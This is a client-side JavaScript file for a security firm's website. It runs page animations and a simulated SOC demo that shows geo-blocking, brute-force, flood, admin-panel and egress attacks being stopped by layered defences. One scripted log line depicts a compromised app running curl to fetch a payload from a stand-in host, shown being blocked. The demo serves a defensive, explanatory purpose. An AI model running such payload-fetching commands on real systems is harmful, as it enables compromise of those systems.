// Tarantec: interações da página. Sem bibliotecas e sem nada inline (a CSP
// só permite scripts do próprio site).
(function () {
  "use strict";

  const raiz = document.documentElement;
  const calmo = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
  const mouseFino = window.matchMedia("(pointer: fine)").matches;
  const $ = (s, el = document) => el.querySelector(s);
  const $$ = (s, el = document) => Array.from(el.querySelectorAll(s));

  /* ---------- nav e tema ---------- */
  const nav = $("#nav");
  const aoRolar = () => nav.classList.toggle("rolou", window.scrollY > 30);
  window.addEventListener("scroll", aoRolar, { passive: true });
  aoRolar();

  const botaoTema = $("#tema");
  const corTema = $('meta[name="theme-color"]');
  function aplicarTema(t) {
    raiz.setAttribute("data-theme", t);
    botaoTema.setAttribute("aria-label", t === "light" ? "Mudar para o tema escuro" : "Mudar para o tema claro");
    corTema.setAttribute("content", t === "light" ? "#fff7ec" : "#0d1117");
    try { localStorage.setItem("tema", t); } catch (e) { /* ok */ }
    teia.cor();
  }
  botaoTema.addEventListener("click", () => {
    aplicarTema(raiz.getAttribute("data-theme") === "light" ? "dark" : "light");
  });

  /* ---------- revelar no scroll e contadores ---------- */
  function contar(el) {
    const fim = Number(el.dataset.contar);
    if (calmo) { el.textContent = fim; return; }
    const t0 = performance.now(), dur = 1400;
    const passo = (t) => {
      const k = Math.min(1, (t - t0) / dur);
      el.textContent = Math.round(fim * (1 - Math.pow(1 - k, 3)));
      if (k < 1) requestAnimationFrame(passo);
    };
    requestAnimationFrame(passo);
  }
  const observador = new IntersectionObserver((itens) => {
    for (const it of itens) {
      if (!it.isIntersecting) continue;
      it.target.classList.add("visivel");
      const n = $("[data-contar]", it.target);
      if (n) contar(n);
      observador.unobserve(it.target);
    }
  }, { threshold: 0.15 });
  $$(".revelar").forEach((el) => observador.observe(el));

  /* ---------- manifesto: acende palavra por palavra ---------- */
  const manifesto = $("#manifesto");
  const quentes = /^(segurança|isolado|login|avisa|SOC,|Blue|Team|servidor)/i;
  manifesto.innerHTML = manifesto.textContent.trim().split(/\s+/)
    .map((w) => `<span class="p${quentes.test(w) ? " quente" : ""}">${w}</span>`).join(" ");
  const palavras = $$(".p", manifesto);
  function acender() {
    const r = manifesto.getBoundingClientRect();
    const k = (window.innerHeight * 0.85 - r.top) / (r.height + window.innerHeight * 0.35);
    const n = Math.floor(Math.max(0, Math.min(1, k)) * palavras.length);
    palavras.forEach((p, i) => p.classList.toggle("acesa", i < n));
  }
  if (!calmo) { window.addEventListener("scroll", acender, { passive: true }); acender(); }

  /* ---------- terminal digitando ---------- */
  const comandos = [
    "tail -f /var/log/teia.log",
    "cscli decisions list",
    "docker network inspect bergatrix-drop",
    "logcli query '{job=\"traefik\"} |= \"403\"'",
    "restic snapshots --latest 1",
  ];
  const digitado = $("#digitado");
  if (!calmo) {
    let c = 0;
    const espera = (ms) => new Promise((r) => setTimeout(r, ms));
    (async function ciclo() {
      await espera(2600);
      for (;;) {
        const txt = comandos[c];
        for (let i = digitado.textContent.length; i > 0; i--) { digitado.textContent = digitado.textContent.slice(0, -1); await espera(22); }
        for (let i = 1; i <= txt.length; i++) { digitado.textContent = txt.slice(0, i); await espera(55); }
        await espera(2200);
        c = (c + 1) % comandos.length;
      }
    })();
  }

  /* ---------- a teia do hero: vibra onde o mouse passa ---------- */
  const teia = (function () {
    const canvas = $("#teiaCanvas");
    const ctx = canvas.getContext("2d");
    const RAIOS = 18, ANEIS = 11;
    let w = 0, h = 0, cx = 0, cy = 0, pontos = [], corFio = "rgba(230,237,243,.16)", corVermelha = "#e5231f";
    let rodando = false, visivel = true, energia = 0;
    const mouse = { x: -9999, y: -9999, vx: 0, vy: 0 };

    function cor() {
      const css = getComputedStyle(raiz);
      corFio = css.getPropertyValue("--fio").trim() || corFio;
      corVermelha = css.getPropertyValue("--red").trim() || corVermelha;
      desenhar();
    }

    function montar() {
      const dpr = Math.min(window.devicePixelRatio || 1, 2);
      w = canvas.clientWidth; h = canvas.clientHeight;
      canvas.width = w * dpr; canvas.height = h * dpr;
      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
      cx = w * 0.8; cy = h * 0.12;
      const alcance = Math.hypot(Math.max(cx, w - cx), Math.max(cy, h - cy)) * 1.05;
      pontos = [];
      for (let r = 0; r < RAIOS; r++) {
        const ang = (r / RAIOS) * Math.PI * 2 + Math.sin(r * 7.3) * 0.06;
        const linha = [];
        for (let a = 1; a <= ANEIS; a++) {
          const d = alcance * Math.pow(a / ANEIS, 1.25) * (1 + Math.sin(r * 3.1 + a) * 0.025);
          linha.push({ bx: cx + Math.cos(ang) * d, by: cy + Math.sin(ang) * d, dx: 0, dy: 0, vx: 0, vy: 0 });
        }
        pontos.push(linha);
      }
      desenhar();
    }

    function desenhar() {
      ctx.clearRect(0, 0, w, h);
      ctx.lineWidth = 1.2;
      ctx.strokeStyle = corFio;
      ctx.beginPath();
      for (const linha of pontos) {
        ctx.moveTo(cx, cy);
        for (const p of linha) ctx.lineTo(p.bx + p.dx, p.by + p.dy);
      }
      // anéis com uma leve barriga para o centro, como fio de verdade
      for (let a = 0; a < ANEIS; a++) {
        for (let r = 0; r < RAIOS; r++) {
          const p = pontos[r][a], q = pontos[(r + 1) % RAIOS][a];
          const px = p.bx + p.dx, py = p.by + p.dy, qx = q.bx + q.dx, qy = q.by + q.dy;
          const mx = (px + qx) / 2, my = (py + qy) / 2;
          if (r === 0) ctx.moveTo(px, py);
          ctx.quadraticCurveTo(mx + (cx - mx) * 0.08, my + (cy - my) * 0.08, qx, qy);
        }
      }
      ctx.stroke();
      // fios que estão vibrando ganham um brilho vermelho
      if (energia > 0.5) {
        ctx.fillStyle = corVermelha;
        for (const linha of pontos) for (const p of linha) {
          const m = Math.abs(p.dx) + Math.abs(p.dy);
          if (m > 2) { ctx.globalAlpha = Math.min(0.9, m / 30); ctx.beginPath(); ctx.arc(p.bx + p.dx, p.by + p.dy, 2.2, 0, 6.283); ctx.fill(); }
        }
        ctx.globalAlpha = 1;
      }
    }

    function passo() {
      energia = 0;
      for (const linha of pontos) for (const p of linha) {
        const ex = p.bx + p.dx - mouse.x, ey = p.by + p.dy - mouse.y;
        const dist = Math.hypot(ex, ey);
        if (dist < 130) {
          const f = (1 - dist / 130) * 0.9;
          p.vx += mouse.vx * f * 0.25 + (ex / (dist || 1)) * f * 1.6;
          p.vy += mouse.vy * f * 0.25 + (ey / (dist || 1)) * f * 1.6;
        }
        p.vx += -p.dx * 0.06; p.vy += -p.dy * 0.06;   // mola
        p.vx *= 0.88; p.vy *= 0.88;                   // atrito
        p.dx += p.vx; p.dy += p.vy;
        energia += Math.abs(p.vx) + Math.abs(p.vy);
      }
      mouse.vx *= 0.5; mouse.vy *= 0.5;
      desenhar();
      if (energia > 0.4 && visivel) requestAnimationFrame(passo);
      else rodando = false;
    }
    function acordar() { if (!rodando && !calmo && visivel) { rodando = true; requestAnimationFrame(passo); } }

    const hero = canvas.parentElement;
    hero.addEventListener("pointermove", (e) => {
      const r = canvas.getBoundingClientRect();
      const x = e.clientX - r.left, y = e.clientY - r.top;
      if (mouse.x > -9000) { mouse.vx = x - mouse.x; mouse.vy = y - mouse.y; }
      mouse.x = x; mouse.y = y;
      acordar();
    });
    hero.addEventListener("pointerleave", () => { mouse.x = mouse.y = -9999; });
    new IntersectionObserver(([it]) => { visivel = it.isIntersecting; }).observe(hero);
    let t;
    window.addEventListener("resize", () => { clearTimeout(t); t = setTimeout(montar, 150); });
    montar();
    cor();
    return { cor };
  })();

  /* ---------- SOC ao vivo ---------- */
  const nos = $$(".no");
  const pacote = $("#pacote");
  const log = $("#log");
  const NOMES = ["Internet", "VPS", "Traefik", "CrowdSec", "Authentik", "App"];
  // Cada passo: [nó onde o pacote está, linhas de log que acontecem ali].
  // O último passo é onde o ataque morre.
  const ATAQUES = {
    geo: [
      [0, [["info", "→ 203.0.113.50 (EUA) abre conexão em tcp/443"]]],
      [1, [["ruim", "vps  nftables: origem fora do Brasil, descarte silencioso"],
           ["info", "vps  nenhum pacote de resposta. Para quem está fora, o servidor não existe."]]],
    ],
    forca: [
      [0, [["info", "→ 198.51.100.23 POST /login user=admin"]]],
      [1, [["ok", "vps  origem no Brasil, segue pelo túnel WireGuard"]]],
      [2, [["ok", "traefik  TLS ok, rota do Authentik"]]],
      [3, [["ok", "crowdsec  IP sem histórico, passa"]]],
      [4, [["ruim", "authentik  falha de login user=admin (1)"],
           ["ruim", "authentik  falha de login user=admin (2)"],
           ["ruim", "authentik  falha de login user=root (3) ..."]]],
      [3, [["info", "crowdsec  cenário de força bruta disparou no log do Traefik"],
           ["ruim", "crowdsec  decisão: ban 198.51.100.23 por 4h"],
           ["ok", "traefik  bouncer: 403 para 198.51.100.23 em qualquer subdomínio"]]],
    ],
    flood: [
      [0, [["info", "→ 192.0.2.77 GET / x 200 em 10 s"]]],
      [1, [["ok", "vps  origem no Brasil, segue pelo túnel"]]],
      [2, [["info", "traefik  rate limit do app: 60 req/min por IP, rajada de 30"],
           ["ruim", "traefik  429 Too Many Requests para 192.0.2.77"],
           ["ok", "o app nem fica sabendo; se insistir, o CrowdSec entra na conversa"]]],
    ],
    painel: [
      [0, [["info", "→ 198.51.100.8 GET painel-admin/ sem sessão"]]],
      [1, [["ok", "vps  origem no Brasil, segue pelo túnel"]]],
      [2, [["ok", "traefik  rota com o middleware do Authentik"]]],
      [3, [["ok", "crowdsec  IP sem histórico, passa"]]],
      [4, [["ruim", "authentik  forward-auth: sem login, 302 para a tela do Authentik"],
           ["ok", "o painel nunca recebe o pedido de quem não está logado"]]],
    ],
    saida: [
      [5, [["info", "app  (comprometido) curl https://203.0.113.9/payload"],
           ["ruim", "app  connect: Network is unreachable"],
           ["info", "docker  a rede do app é internal: true, sem rota para fora"],
           ["ok", "nada sai, e de fora só o Traefik entra"]]],
    ],
  };

  let execucao = 0;
  function posicionar(i) {
    const no = nos[i];
    pacote.style.left = (no.offsetLeft + no.offsetWidth / 2 - 8) + "px";
  }
  function escrever(tipo, txt) {
    const linha = document.createElement("span");
    linha.className = tipo;
    const hora = new Date().toTimeString().slice(0, 8);
    linha.textContent = `${hora}  ${txt}\n`;
    log.appendChild(linha);
  }
  async function simular(nome) {
    const id = ++execucao;
    const passos = ATAQUES[nome];
    const espera = (ms) => new Promise((r) => setTimeout(r, calmo ? 0 : ms));
    nos.forEach((n) => n.classList.remove("passou", "barrou"));
    pacote.classList.remove("morto");
    log.textContent = "";
    pacote.style.transition = "none";
    posicionar(passos[0][0]);
    pacote.style.opacity = "1";
    void pacote.offsetWidth;
    pacote.style.transition = "";

    for (let i = 0; i < passos.length; i++) {
      const [n, linhas] = passos[i];
      const ultimo = i === passos.length - 1;
      posicionar(n);
      await espera(650);
      if (id !== execucao) return;
      if (ultimo) {
        nos.forEach((x) => x.classList.remove("passou"));
        nos[n].classList.add("barrou");
        pacote.classList.add("morto");
      } else {
        nos[n].classList.add("passou");
      }
      for (const linha of linhas) {
        escrever(...linha);
        await espera(420);
        if (id !== execucao) return;
      }
    }
    escrever("ok", `BLOQUEADO em: ${NOMES[passos[passos.length - 1][0]]}. O Bitsy sentiu a vibração.`);
  }
  $$("[data-ataque]").forEach((b) => b.addEventListener("click", () => {
    $$("[data-ataque]").forEach((x) => x.setAttribute("aria-pressed", String(x === b)));
    simular(b.dataset.ataque);
  }));

  /* ---------- cards com tilt ---------- */
  if (mouseFino && !calmo) {
    $$(".card").forEach((card) => {
      card.addEventListener("pointermove", (e) => {
        const r = card.getBoundingClientRect();
        const x = (e.clientX - r.left) / r.width - 0.5, y = (e.clientY - r.top) / r.height - 0.5;
        card.style.transform = `rotateX(${(-y * 6).toFixed(2)}deg) rotateY(${(x * 6).toFixed(2)}deg) translateY(-4px)`;
      });
      card.addEventListener("pointerleave", () => { card.style.transform = ""; });
    });
  }

  /* ---------- adesivos arrastáveis ---------- */
  const area = $("#adesivos");
  $$(".adesivo", area).forEach((ad) => {
    let ox = 0, oy = 0;
    ad.addEventListener("pointerdown", (e) => {
      ad.setPointerCapture(e.pointerId);
      ad.classList.add("pegou");
      const r = ad.getBoundingClientRect();
      ox = e.clientX - r.left; oy = e.clientY - r.top;
    });
    ad.addEventListener("pointermove", (e) => {
      if (!ad.classList.contains("pegou")) return;
      const a = area.getBoundingClientRect();
      const x = Math.max(0, Math.min(a.width - ad.offsetWidth, e.clientX - a.left - ox));
      const y = Math.max(0, Math.min(a.height - ad.offsetHeight, e.clientY - a.top - oy));
      ad.style.left = x + "px"; ad.style.top = y + "px";
    });
    const soltar = () => ad.classList.remove("pegou");
    ad.addEventListener("pointerup", soltar);
    ad.addEventListener("pointercancel", soltar);
  });
})();
